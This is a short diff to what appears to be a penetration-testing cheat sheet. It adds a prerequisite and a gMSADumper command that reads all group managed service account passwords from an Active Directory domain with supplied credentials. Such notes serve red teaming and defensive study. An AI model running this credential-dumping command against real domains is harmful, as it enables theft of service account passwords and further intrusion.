@@ -1,6 +1,11 @@
 ### Source
 https://github.com/micahvandeusen/gMSADumper  
 
+### Prerequisite
+```
+Attacker user needs be listed in the property PrincipalsAllowedToRetrieveManagedPassword of target account.
+```
+
 ### Read all gMSA passwords from any possible computer
 ```
 python3 gMSADumper.py -u <user> -p <password> -d <domain>
